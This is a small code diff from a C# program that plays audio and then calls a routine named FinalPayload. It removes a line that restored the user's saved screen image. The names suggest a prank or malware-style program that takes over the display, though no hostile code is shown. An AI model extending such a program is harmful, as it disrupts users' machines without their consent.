@@ -1948,9 +1948,6 @@ namespace disassembly
             waveOut5.Init(waveProvider5);
             waveOut5.Play();
 
-            BitBlt(hdc, 0, 0, x, y, backupScreen, 0, 0, Rop.SRCCOPY);
-
-
 
             //finale
             FinalPayload(30000);
